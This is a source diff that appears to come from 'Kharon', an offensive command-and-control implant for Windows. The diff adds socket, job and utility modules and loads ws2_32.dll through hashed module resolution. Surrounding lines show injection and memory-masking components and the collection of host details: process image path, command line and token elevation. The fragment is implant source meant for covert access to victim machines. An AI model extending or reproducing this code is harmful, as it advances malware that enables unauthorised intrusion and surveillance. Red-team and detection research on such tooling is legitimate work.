@@ -7,6 +7,9 @@ EXTERN_C DECLFN auto Main(
 ) -> VOID {
     Kharon Kh;
 
+    Socket    KhSocket( &Kh );
+    Jobs      KhJobs( &Kh );
+    Useful    KhUseful( &Kh );
     Dotnet    KhDotnet( &Kh );
     Library   KhLibrary( &Kh );
     Token     KhToken( &Kh );
@@ -20,6 +23,9 @@ EXTERN_C DECLFN auto Main(
     Injection KhInjection( &Kh );
     Mask      KhMask( &Kh );
  
+    Kh.InitSocket( &KhSocket );
+    Kh.InitJobs( &KhJobs );
+    Kh.InitUseful( &KhUseful );
     Kh.InitDotnet( &KhDotnet );
     Kh.InitHeap( &KhHeap );
     Kh.InitLibrary( &KhLibrary );
@@ -66,21 +72,24 @@ auto DECLFN Kharon::Init(
     User32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "user32.dll" ) );
     Shell32.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "shell32.dll" ) );
     Cryptbase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "cryptbase.dll" ) );
+    Ws2_32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ws2_32.dll" ) );
 
     if ( !Mscoree.Handle   ) Mscoree.Handle   = Lib->Load( "mscoree.dll" );
     if ( !Advapi32.Handle  ) Advapi32.Handle  = Lib->Load( "advapi32.dll" );
     if ( !Wininet.Handle   ) Wininet.Handle   = Lib->Load( "wininet.dll" );
-    if ( !Oleaut32.Handle  ) Oleaut32.Handle = Lib->Load( "Oleaut32.dll" );
+    if ( !Oleaut32.Handle  ) Oleaut32.Handle  = Lib->Load( "Oleaut32.dll" );
     if ( !User32.Handle    ) User32.Handle    = Lib->Load( "user32.dll" );
     if ( !Shell32.Handle   ) Shell32.Handle   = Lib->Load( "shell32.dll" );
     if ( !Cryptbase.Handle ) Cryptbase.Handle = Lib->Load( "cryptbase.dll" );
+    if ( !Ws2_32.Handle    ) Ws2_32.Handle    = Lib->Load( "ws2_32.dll" );
 
-    RSL_IMP( Mscoree   );
-    RSL_IMP( Advapi32  );
-    RSL_IMP( Wininet   );
+    RSL_IMP( Mscoree );
+    RSL_IMP( Advapi32 );
+    RSL_IMP( Wininet );
     RSL_IMP( Oleaut32 );
-    RSL_IMP( Shell32   );
+    RSL_IMP( Shell32 );
     RSL_IMP( Cryptbase );
+    RSL_IMP( Ws2_32 );
 
     KhDbgz( "library kernel32.dll  loaded at %p and functions resolveds", Krnl32.Handle    );
     KhDbgz( "library ntdll.dll     loaded at %p and functions resolveds", Ntdll.Handle     );
@@ -91,6 +100,7 @@ auto DECLFN Kharon::Init(
     KhDbgz( "library user32.dll    loaded at %p and functions resolveds", User32.Handle    );
     KhDbgz( "library shell32.dll   loaded at %p and functions resolveds", Shell32.Handle   );
     KhDbgz( "library cryptbase.dll loaded at %p and functions resolveds", Cryptbase.Handle );
+    KhDbgz( "library ws2_32.dll    loaded at %p and functions resolveds", Ws2_32.Handle    );
 
     // /* ========= [ informations collection ] ========= */
     CHAR   cProcessorName[MAX_PATH] = { 0 };
@@ -137,8 +147,8 @@ auto DECLFN Kharon::Init(
     Session.ImagePath   = A_PTR( Hp->Alloc( MAX_PATH ) );
     Session.CommandLine = A_PTR( Hp->Alloc( MAX_PATH ) );
 
-    Str::WCharToChar( Session.ImagePath, PsBasicInfoEx.PebBaseAddress->ProcessParameters->ImagePathName.Buffer, Str::LengthW( PsBasicInfoEx.PebBaseAddress->ProcessParameters->ImagePathName.Buffer ) );
-    Str::WCharToChar( Session.CommandLine, PsBasicInfoEx.PebBaseAddress->ProcessParameters->CommandLine.Buffer, Str::LengthW( PsBasicInfoEx.PebBaseAddress->ProcessParameters->CommandLine.Buffer ) );
+    Str::WCharToChar( Session.ImagePath, PsBasicInfoEx.PebBaseAddress->ProcessParameters->ImagePathName.Buffer, Str::LengthW( PsBasicInfoEx.PebBaseAddress->ProcessParameters->ImagePathName.Buffer ) + 1 );
+    Str::WCharToChar( Session.CommandLine, PsBasicInfoEx.PebBaseAddress->ProcessParameters->CommandLine.Buffer, Str::LengthW( PsBasicInfoEx.PebBaseAddress->ProcessParameters->CommandLine.Buffer ) + 1 );
 
     Success = Advapi32.OpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &TokenHandle );
     Success = Advapi32.GetTokenInformation( TokenHandle, TokenElevation, &Elevation, sizeof( Elevation ), &TokenInfoLen );
